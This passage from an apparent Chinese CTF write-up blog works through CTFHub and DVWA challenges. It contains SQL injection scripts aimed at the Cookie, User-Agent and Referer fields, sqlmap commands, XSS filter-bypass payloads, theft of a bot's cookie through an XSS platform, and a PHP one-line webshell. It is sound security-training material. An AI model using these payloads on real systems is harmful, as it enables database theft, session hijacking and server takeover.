<p>那如果把if的第一个参数改变一下呢？</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> if(<span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span>, <span class="hljs-number">1</span>, sleep(<span class="hljs-number">2</span>))<br></code></pre></td></tr></table></figure>
<p>第一个参数是false，if函数会返回第二个参数<code>sleep(2)</code>，这会让这个查询语句睡眠两秒，再返回结果。</p>
<p><img src="https://upyun.wuuconix.link/image-20210828200944498.png" srcset="/img/loading.gif" lazyload alt="睡眠中" /></p>
<p>同时由于这个sleep函数本身的返回值是0，即false。</p>
<p><img src="https://upyun.wuuconix.link/image-20210828201032029.png" srcset="/img/loading.gif" lazyload alt="mysql中sleep的返回值" /></p>
<p>故那条语句的结果将会返回空。</p>
<p><img src="https://upyun.wuuconix.link/image-20210828201131765.png" srcset="/img/loading.gif" lazyload alt="Empty set" /></p>
<p>同时我们的脚本还需要对这个睡眠2秒进行识别，因为sql查询语句睡眠了两秒，那么php也会跟着等，整个页面将会进入等待而迟迟不给出相应，我们的request就需要根据相应给出的时间来得到这个<code>success_flag</code>。</p>
<p>这样即可，在get请求中写一个<code>timeout</code>参数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">requests.get(url, headers=headers, timeout=<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>
<p>如果在1s钟内服务器没有返回信息，那么request就会报错。</p>
<p><img src="https://upyun.wuuconix.link/image-20210828202748017.png" srcset="/img/loading.gif" lazyload alt="reqeusts.exceptions.ReadTimeout" /></p>
<p>然后我们就可以用异常捕捉语句来捕捉这个报错，从而根据有没有报错来判断我们需要判断的信息是否正确。</p>
<p><img src="https://upyun.wuuconix.link/image-20210828203018185.png" srcset="/img/loading.gif" lazyload alt="异常捕捉" /></p>
<p>时间盲注的脚本已经更新到<a target="_blank" rel="noopener" href="https://github.com/wuuconix/SQL-Blind-Injection-Auto/blob/main/blind_time_int.py">github</a>，这里就不写了，太长了。</p>
<p>实际上也就是在昨天脚本的基础上套上了一层if，然后把<code>success_flag</code>换成了异常处理。</p>
<h3 id="cookie注入"><a class="markdownIt-Anchor" href="#cookie注入"></a> Cookie注入</h3>
<p>Cookie注入界面一般不会给你输入框，类似这道题目。</p>
<p><img src="https://upyun.wuuconix.link/image-20210829112805087.png" srcset="/img/loading.gif" lazyload alt="Cookie注入" /></p>
<p>它的注入点存在于Cookie之中。这是Burp抓包的结果。</p>
<p><img src="https://upyun.wuuconix.link/image-20210829112911755.png" srcset="/img/loading.gif" lazyload alt="Cookie id" /></p>
<p>那就很简单了，我们还是利用那个强大的插件，Copy as requests，把请求转化为python中的request代码。之后改一下id的值就行。因为这道题是有回显的，所以用最基本的联合注入即可，要是Cookie配合上时间盲注就有意思了2333。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-comment"># id = &quot;1 and 1=2 union select database(), 1&quot; #爆库</span><br><span class="hljs-comment"># id = &quot;1 and 1=2 union select group_concat(table_name), 1 from information_schema.tables where table_schema = &#x27;sqli&#x27;&quot; #爆表</span><br><span class="hljs-comment"># id = &quot;1 and 1=2 union select group_concat(column_name), 1 from information_schema.columns where table_name = &#x27;fwtzeovuem&#x27;&quot; #爆字段</span><br><span class="hljs-built_in">id</span> = <span class="hljs-string">&quot;1 and 1=2 union select rzahbuabdf, 1 from fwtzeovuem&quot;</span> <span class="hljs-comment">#get flag</span><br>burp0_url = <span class="hljs-string">&quot;http://challenge-498ee75cbbb367a1.sandbox.ctfhub.com:10800/&quot;</span><br>burp0_cookies = &#123;<span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-built_in">id</span>, <span class="hljs-string">&quot;hint&quot;</span>: <span class="hljs-string">&quot;id%E8%BE%93%E5%85%A51%E8%AF%95%E8%AF%95%EF%BC%9F&quot;</span>&#125;<br>burp0_headers = &#123;<span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0&quot;</span>, <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;</span>, <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>, <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate&quot;</span>, <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;close&quot;</span>, <span class="hljs-string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;Cache-Control&quot;</span>: <span class="hljs-string">&quot;max-age=0&quot;</span>&#125;<br><span class="hljs-built_in">print</span>(requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies).text)<br></code></pre></td></tr></table></figure>
<p><img src="https://upyun.wuuconix.link/image-20210829113148197.png" srcset="/img/loading.gif" lazyload alt="flag" /></p>
<p>因为这道题比较简单，我还试了一下<code>sqlmap</code>。这次总算不是日常<code>坚不可摧</code>了。成功得到了flag。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 sqlmap.py -u <span class="hljs-string">&quot;http://challenge-498ee75cbbb367a1.sandbox.ctfhub.com:10800&quot;</span> --cookie <span class="hljs-string">&quot;id=1&quot;</span> --level 2 -D sqli -T fwtzeovuem -C rzahbuabdf --dump<br></code></pre></td></tr></table></figure>
<p><img src="https://upyun.wuuconix.link/image-20210829113324069.png" srcset="/img/loading.gif" lazyload alt="sqlmap" /></p>
<h3 id="ua注入"><a class="markdownIt-Anchor" href="#ua注入"></a> UA注入</h3>
<p>UA注入和Cookie类似，只是换了个注入位置。基于的还是最基础的Union注入。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>burp0_url = <span class="hljs-string">&quot;http://challenge-c1afe7c2c2a76623.sandbox.ctfhub.com:10800/&quot;</span><br><span class="hljs-comment"># UA = &quot;1 and 1=2 union select 1, database()&quot;</span><br><span class="hljs-comment"># UA = &quot;1 and 1=2 union select 1, group_concat(table_name) from information_schema.tables where table_schema=&#x27;sqli&#x27;&quot;</span><br><span class="hljs-comment"># UA = &quot;1 and 1=2 union select 1, group_concat(column_name) from information_schema.columns where table_name=&#x27;cqomjcukck&#x27;&quot;</span><br>UA = <span class="hljs-string">&quot;1 and 1=2 union select 1, ycrtshvcir from cqomjcukck&quot;</span><br>burp0_headers = &#123;<span class="hljs-string">&quot;User-Agent&quot;</span>: UA, <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;</span>, <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>, <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate&quot;</span>, <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;close&quot;</span>, <span class="hljs-string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>&#125;<br><span class="hljs-built_in">print</span>(requests.get(burp0_url, headers=burp0_headers).text)<br></code></pre></td></tr></table></figure>
<p><img src="https://upyun.wuuconix.link/image-20210829115147165.png" srcset="/img/loading.gif" lazyload alt="脚本运行结果" /></p>
<p><img src="https://upyun.wuuconix.link/image-20210829115211468.png" srcset="/img/loading.gif" lazyload alt="burp render" /></p>
<p>照例，还是试了一下sqlmap，我才发现sqlmap原来这么好用。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 sqlmap.py -u <span class="hljs-string">&quot;http://challenge-c1afe7c2c2a76623.sandbox.ctfhub.com:10800/&quot;</span> --level 3<br></code></pre></td></tr></table></figure>
<p>只是设置了level为3，其他什么都不给。结果一上来就提示UA是动态的，可注入。</p>
<p><img src="https://upyun.wuuconix.link/image-20210829123038111.png" srcset="/img/loading.gif" lazyload alt="开局UA可注入" /></p>
<p><img src="https://upyun.wuuconix.link/image-20210829115536536.png" srcset="/img/loading.gif" lazyload alt="sqlmap提示结果" /></p>
<p>它提示在UA这个参数这里有两种可能的注入，一种是时间盲注，一种是union联合注入，还都出了payload。</p>
<p>这确实非常强。为什么这里时间盲注也可以呢？这相当于不看页面的回显，直接用响应时间来判断，这么想来是不是大部分的sql注入都适合时间盲注2333。</p>
<p>当然自己注入的话，肯定会选择十分简单的union联合注入。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 sqlmap.py -u <span class="hljs-string">&quot;http://challenge-c1afe7c2c2a76623.sandbox.ctfhub.com:10800/&quot;</span> --level 3 -D sqli -T cqomjcukck --columns<br></code></pre></td></tr></table></figure>
<p><img src="https://upyun.wuuconix.link/image-20210829115822120.png" srcset="/img/loading.gif" lazyload alt="sqlmap get flag" /></p>
<p>而且sqlmap有一个非常牛逼的点，它每次运行完都会把该网站的结果存在某个文件中，下次深入获得信息的时候会直接从文件中读取之前取得的成果，而不用从头开始，这大大提高了效率。</p>
<h3 id="refer注入"><a class="markdownIt-Anchor" href="#refer注入"></a> Refer注入</h3>
<p>和Cookie注入和UA注入类似，不多说了，只是换了一个地方。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>burp0_url = <span class="hljs-string">&quot;http://challenge-49bfa8cdc6c5744d.sandbox.ctfhub.com:10800/&quot;</span><br><span class="hljs-comment"># referer = &quot;1 and 1=2 union select 1, database()&quot;</span><br><span class="hljs-comment"># referer = &quot;1 and 1=2 union select 1, group_concat(table_name) from information_schema.tables where table_schema = &#x27;sqli&#x27;&quot;</span><br><span class="hljs-comment"># referer = &quot;1 and 1=2 union select 1, group_concat(column_name) from information_schema.columns where table_name = &#x27;sngrgwaxpk&#x27;&quot;</span><br>referer = <span class="hljs-string">&quot;1 and 1=2 union select 1, lwwwrezxpx from sngrgwaxpk&quot;</span><br>burp0_headers = &#123;<span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0&quot;</span>, <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;</span>, <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>, <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate&quot;</span>, <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;close&quot;</span>, <span class="hljs-string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;Referer&quot;</span>: referer&#125;<br><br><span class="hljs-built_in">print</span>(requests.get(burp0_url, headers=burp0_headers).text)<br></code></pre></td></tr></table></figure>
<p><img src="https://upyun.wuuconix.link/image-20210829122302946.png" srcset="/img/loading.gif" lazyload alt="refer flag" /></p>
<p><img src="https://upyun.wuuconix.link/image-20210829122339092.png" srcset="/img/loading.gif" lazyload alt="burp refer flag" /></p>
<p>这道题貌似sqlmap就不太好使了。</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python3</span> sqlmap.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> http://challenge-<span class="hljs-number">49</span>bfa8cdc6c5744d.<span class="hljs-keyword">sandbox</span>.ctfhub.<span class="hljs-keyword">com</span>:<span class="hljs-number">10800</span>/ --level <span class="hljs-number">3</span><br></code></pre></td></tr></table></figure>
<p><img src="https://upyun.wuuconix.link/image-20210829122408424.png" srcset="/img/loading.gif" lazyload alt="sqlmap结果" /></p>
<p>它发现了Referer是脆弱的，但是只检查出了时间盲注，没有检查出union注入。之后的时间盲注也一直失败。</p>
<p><img src="https://upyun.wuuconix.link/image-20210829122903203.png" srcset="/img/loading.gif" lazyload alt="sqlmap time-based blind" /></p>
<p>当然也可能是我在中途选则选项的时候没有选好2333。</p>
<h3 id="过滤空格"><a class="markdownIt-Anchor" href="#过滤空格"></a> 过滤空格</h3>
<p>这道题过滤了空格，可以用注释符<code>/**/</code>来代替空格。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br>burp0_url = <span class="hljs-string">&quot;http://challenge-b018c199badc637a.sandbox.ctfhub.com:10800/?id=&quot;</span><br><span class="hljs-comment"># id = &quot;1/**/and/**/1=2/**/union/**/select/**/1,database()&quot;</span><br><span class="hljs-comment"># id = &quot;1/**/and/**/1=2/**/union/**/select/**/1,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/=/**/&#x27;sqli&#x27;&quot;</span><br><span class="hljs-comment"># id = &quot;1/**/and/**/1=2/**/union/**/select/**/1,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/=/**/&#x27;lsoupzeglx&#x27;&quot;</span><br><span class="hljs-built_in">id</span> = <span class="hljs-string">&quot;1/**/and/**/1=2/**/union/**/select/**/1,pqmtlqzjwp/**/from/**/lsoupzeglx&quot;</span><br>burp0_headers = &#123;<span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0&quot;</span>, <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;</span>, <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>, <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate&quot;</span>, <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;close&quot;</span>, <span class="hljs-string">&quot;Referer&quot;</span>: <span class="hljs-string">&quot;http://challenge-b018c199badc637a.sandbox.ctfhub.com:10800/?id=1&quot;</span>, <span class="hljs-string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>&#125;<br><span class="hljs-built_in">print</span>(requests.get(burp0_url + quote(<span class="hljs-built_in">id</span>), headers=burp0_headers).text)<br></code></pre></td></tr></table></figure>
<p><img src="https://upyun.wuuconix.link/image-20210830104320532.png" srcset="/img/loading.gif" lazyload alt="space flag" /></p>
<p>按理说用括号来代替也可以，但是括号的替换难度较大，可能我的姿势不对，没有成功。</p>
<p>用sqlmap的时候发现了一个功能，sqlmap原始的payload尝试应该都是用的空格来分隔的，所以它就会返回id不可注入的结果。</p>
<p>查阅资料后发现sqlmap有个叫做tamper的功能。实际上就是在tamper文件夹下有一些脚本。</p>
<p><img src="https://upyun.wuuconix.link/image-20210830104905439.png" srcset="/img/loading.gif" lazyload alt="tamper脚本" /></p>
<p>这道题里就可以使用里面的<code>space2comment.py</code>脚本，把空格转化为注释符。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 sqlmap.py -u <span class="hljs-string">&quot;http://challenge-b018c199badc637a.sandbox.ctfhub.com:10800/?id=1&quot;</span> -p <span class="hljs-built_in">id</span> --level 3 --tamper=<span class="hljs-string">&quot;space2comment.py&quot;</span><br></code></pre></td></tr></table></figure>
<p>运行后就可以发现sqlmap已经可以发现注入点了。</p>
<p><img src="https://upyun.wuuconix.link/image-20210830105043062.png" srcset="/img/loading.gif" lazyload alt="注入点发现" /></p>
<p>虽然是时间盲注2333，可能sqlmap对页面的具体内容很难进行判断，无法在页面上获得<code>succcess_flag</code>，对它来说用页面相应的时间来说还更简单了2333。</p>
<p>到这里ctfhub的sql注入题目就做完了。</p>
<p><img src="https://upyun.wuuconix.link/image-20210830105259252.png" srcset="/img/loading.gif" lazyload alt="ctfhub sql注入" /></p>
<h2 id="xss"><a class="markdownIt-Anchor" href="#xss"></a> XSS</h2>
<h3 id="反射型"><a class="markdownIt-Anchor" href="#反射型"></a> 反射型</h3>
<p>本来看ctfhub上有xss的题目，打算好好学习一波，结果点开一看，只有一道题2333。</p>
<p>便现在dvwa上熟悉了一波。所谓反射型是相对于存储型来讲的。</p>
<p>如果黑客的xss注入是通过某种方式储存到了数据库中，那就是存储型的，这种xss的特点就是每次访问该页面都会收到xss攻击，因为js语句已经放在数据库里了。</p>
<p>而反射型xss则不是这样，每次触发只能手动输入和点击才能触发。</p>
<p>我认为xss产生的原因主要是对html标签审查不严格造成的。</p>
<p>下面写一下dvwa中的三种难度的反射型xss。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// Low难度</span><br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;<br>    <span class="hljs-comment">// Feedback for end user</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>这里没有对输入<code>$_GET['name']</code>做任何限制，我们完全可以在这个变量里写一个script标签。</p>
<p><img src="https://upyun.wuuconix.link/image-20210831234719702.png" srcset="/img/loading.gif" lazyload alt="xss low" /></p>
<p><img src="https://upyun.wuuconix.link/image-20210831234812621.png" srcset="/img/loading.gif" lazyload alt="成功弹出" /></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// Medium 难度</span><br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">str_replace</span>( <span class="hljs-string">&#x27;&lt;script&gt;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] );<br>    <span class="hljs-comment">// Feedback for end user</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>这里把输入里的<code>&lt;script&gt;</code>替换为了空字符。但是这里是大小写敏感的，我们完全可以大写绕过。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;<span class="hljs-title class_">Script</span>&gt;<span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;medium&quot;</span>)&lt;/script&gt;<br></code></pre></td></tr></table></figure>
<p><img src="https://upyun.wuuconix.link/image-20210831235040622.png" srcset="/img/loading.gif" lazyload alt="medium" /></p>
<p><img src="https://upyun.wuuconix.link/image-20210831235118681.png" srcset="/img/loading.gif" lazyload alt="medium xss" /></p>
<p>或者双拼绕过。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;scri&lt;script&gt;pt&gt;<span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;medium&quot;</span>)&lt;/script&gt;<br></code></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// High 难度</span><br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">preg_replace</span>( <span class="hljs-string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] );<br>    <span class="hljs-comment">// Feedback for end user</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>最高难度用了正则匹配，并且大小写不敏感。上面两种方法都失效了。</p>
<p>但是它只过滤了<code>script</code>标签这种xss，还可以利用img标签报错来实现弹窗。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">0</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(</span>&quot;<span class="hljs-attr">high</span>&quot;)&gt;</span><br></code></pre></td></tr></table></figure>
<p><img src="https://upyun.wuuconix.link/image-20210831235704872.png" srcset="/img/loading.gif" lazyload alt="high xss" /></p>
<p>然后我便开始做ctfhub的题目了。我试了一下，发现它没有任何验证，可以直接xss。</p>
<p><img src="https://upyun.wuuconix.link/image-20210901000322885.png" srcset="/img/loading.gif" lazyload alt="ctfhub xss" /></p>
<p><img src="https://upyun.wuuconix.link/image-20210901000254656.png" srcset="/img/loading.gif" lazyload alt="xss" /></p>
<p>但是我不知道flag会藏在哪里，xss的作用只是操控js，会不会藏在cookie里呢？</p>
<p><img src="https://upyun.wuuconix.link/image-20210901000435267.png" srcset="/img/loading.gif" lazyload alt="cookie?" /></p>
<p><img src="https://upyun.wuuconix.link/image-20210901000451801.png" srcset="/img/loading.gif" lazyload alt="没有flag" /></p>
<p>很不幸，没有flag。我陷入了人生和社会的大思考。</p>
<p>最终没法，看了writeup。发现需要利用到第二个输入框。</p>
<p><img src="https://upyun.wuuconix.link/image-20210901001128904.png" srcset="/img/loading.gif" lazyload alt="第二个输入框" /></p>
<p>第二个输入框点击send之后就会显示<code>successfully</code>，但是这个它发送到哪里无法确定，这个网页用到Bootstrap，我不太熟悉。这可以肯定的是它有一个后端。</p>
<p>然后可以利用<a target="_blank" rel="noopener" href="http://xsscom.com/">xss platform</a>来进行获得它与后端的信息。</p>
<p>在xss platform里新建一个项目然后复制其中的实例代码。</p>
<p><img src="https://upyun.wuuconix.link/image-20210901001617672.png" srcset="/img/loading.gif" lazyload alt="xss-platform" /></p>
<p>把payload在第一个输入框提交，然后复制url到第二个输入框提交后，就会在xss platform里得到相应。</p>
<p><img src="https://upyun.wuuconix.link/image-20210901001826279.png" srcset="/img/loading.gif" lazyload alt="大体情况" /></p>
<p><img src="https://upyun.wuuconix.link/image-20210901002047943.png" srcset="/img/loading.gif" lazyload alt="cookie中的flag" /></p>
<p>下面进行战术总结</p>
<p>我们一开始直接用xss来看cookie，发现没有flag。我一开始觉得奇怪，觉得flag就应该藏到这个地方，不然还能藏哪呢？</p>
<p>我这里犯了一个原则性的错误。我们用xss一般的用途是什么？是获取cookie嘛？</p>
<p>是获取cookie，但更准确的说，是获取别人的cookie。</p>
<p>cookie相当于每个人的登录凭证，如果得到了别人的cookie，我们将可以不用输账号密码，直接登录。</p>
<p>所以flag一定是不可能藏在自己的cookie里的，自己的cookie没有意义，自己的cookie能直接浏览器控制台里知道，也不需要xss。ctf的题目应该是让我们获得别人的cookie，但是这是ctf的题目，不是公共的服务，没有其他用户，所以ctf模拟了一个机器人。</p>
<p><img src="https://upyun.wuuconix.link/image-20210901004325251.png" srcset="/img/loading.gif" lazyload alt="bot" /></p>
<p>那就很清楚了，我们的目标就是获得这个机器人的Cookie，然后&quot;盗它的号&quot;，所以获取了这个机器人的Cookie就意味着成功。所以理所应当的，flag也就藏在cookie里了。</p>
<p>所以第二个文本框就是模拟别人点击这个包含xss的链接的情形。</p>
<h2 id="文件上传"><a class="markdownIt-Anchor" href="#文件上传"></a> 文件上传</h2>
<h3 id="无验证"><a class="markdownIt-Anchor" href="#无验证"></a> 无验证</h3>
<p>最简单的文件上传，传个php一句话木马即可。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;wuuconix&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p><img src="https://upyun.wuuconix.link/image-20210901113611321.png" srcset="/img/loading.gif" lazyload alt="上传成功" /></p>
<p>之后用蚁剑连接就可以得到flag啦！</p>
<p><img src="https://upyun.wuuconix.link/image-20210901113721206.png" srcset="/img/loading.gif" lazyload alt="antsword flag" /></p>
<h3 id="前端验证"><a class="markdownIt-Anchor" href="#前端验证"></a> 前端验证</h3>
<p>网页源码</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>CTFHub 文件上传 - js前端验证<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span 